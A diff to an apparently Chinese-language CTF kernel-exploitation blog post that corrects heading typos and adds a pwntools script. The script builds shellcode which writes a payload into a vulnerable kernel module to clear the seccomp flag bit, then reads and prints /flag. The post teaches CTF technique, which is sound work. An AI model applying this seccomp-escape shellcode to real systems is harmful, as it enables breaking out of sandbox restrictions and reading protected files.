@@ -26,7 +26,7 @@ comments: true
     - [5.3.2 seccomp逃逸](#532-seccomp逃逸)
 - [特典: kernel pwn tricks:](#特典-kernel-pwn-tricks)
   - [特典一：qemu monitor模式](#特典一qemu-monitor模式)
-  - [特点二：如何找到kernel api地址](#特点二如何找到kernel-api地址)
+  - [特典二：如何找到kernel api地址](#特典二如何找到kernel-api地址)
   - [特典三: kernel pwn远程传文件脚本](#特典三-kernel-pwn远程传文件脚本)
   - [特点四： kernel pwn模板](#特点四-kernel-pwn模板)
 
@@ -302,8 +302,67 @@ clean:
 直接执行`make`命令后，可以看到内核代码:<br>
 ![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250923223119.png)
 **需要注意的是，实际上current->thread_info.flags不是gs:0x0的位置，我们需要手动确定其偏移：可以通过`p/x &current_task`在gdb中查看偏移**<br>
-知道汇编代码后，可以利用`pwntools`的汇编模块来帮助我们生成shellcode:<br>
+或者，将编译好的驱动通过`insmod`安装到内核当中，可以通过gdb调试获取相应位置:<br>
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250927135007.png)
 
+随后，可以利用`pwntools`的汇编模块来帮助我们生成shellcode:<br>
+```python
+from pwn import *
+context.arch = 'amd64'
+context.os = 'linux'
+
+escape_seccomp_shellcode = """
+mov    rax,QWORD PTR gs:0x15d00
+and    QWORD PTR [rax],0xfffffffffffffeff
+ret
+"""
+
+execute_shellcode = f"""
+/*write escape_seccomp_shellcode into kernel_module*/
+mov rax, SYS_write
+mov rdi, 3
+lea rsi, [rip+escape_seccomp_shellcode]
+mov rdx, {len(asm(escape_seccomp_shellcode))}
+syscall
+
+/*get flag*/
+mov rax, SYS_open
+lea rdi, [rip+file_name]
+mov rsi, O_RDONLY
+mov rdx, 511
+syscall
+
+mov rdi, rax
+lea rsi, [rip+buffer]
+mov rdx, 0x200
+mov rax, SYS_read
+syscall
+
+mov rdi, 1 #out_fd
+lea rsi, [rip+buffer]
+mov rdx, 0x200
+mov rax, SYS_write
+syscall
+
+mov rax, SYS_exit
+syscall
+
+escape_seccomp_shellcode:
+{escape_seccomp_shellcode}
+
+.align 8
+file_name:
+.string "/flag"
+.align 8
+buffer:
+.space 0x200
+"""
+
+bytes_io = asm(execute_shellcode)
+f = open("./shellcode.bin","wb")
+f.write(bytes_io)
+f.close()
+```
 
 # 特典: kernel pwn tricks:<br>
 这些特典或许不能帮助我们理解kernel，但是可以帮助我们ctf题目中快速拿分！<br>
@@ -346,7 +405,7 @@ qemu-system-x86_64: Unable to write to command: Broken pipe
 
 [https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/tricks/qemu-monitor/](https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/tricks/qemu-monitor/)<br>
 
-## 特点二：如何找到kernel api地址<br>
+## 特典二：如何找到kernel api地址<br>
 对于开启了kaslr的题目，想办法获取kernel地址是非常重要的：<br>
 ```
 0. 内核没开启kaslr（可以通过cat /proc/cmdline确认）
